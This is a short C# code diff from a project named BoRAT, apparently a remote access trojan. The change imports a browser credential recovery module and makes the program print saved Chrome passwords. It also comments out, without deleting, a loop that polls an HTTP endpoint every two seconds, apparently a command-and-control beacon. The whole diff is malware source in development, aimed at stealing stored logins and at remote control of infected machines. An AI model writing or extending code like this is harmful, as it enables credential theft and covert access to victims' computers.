@@ -1,6 +1,7 @@
 ﻿using System;
-using BoRAT.Network;
 using System.Threading;
+using BoRAT.Core.Network;
+using BoRAT.Core.Recovery.Browsers;
 
 namespace BoRAT
 {
@@ -8,11 +9,13 @@ namespace BoRAT
     {
         static void Main(string[] args)
         {
-            while(true)
-            {
-                Http.Request();
-                Thread.Sleep(2000);
-            }
+            foreach (RecoveredAccount acc in Chrome.GetSavedPasswords())
+                Console.Write(acc.ToString());
+            //while(true)
+            //{
+            //    Http.Request();
+            //    Thread.Sleep(2000);
+            //}
 
             Console.ReadKey();
         }
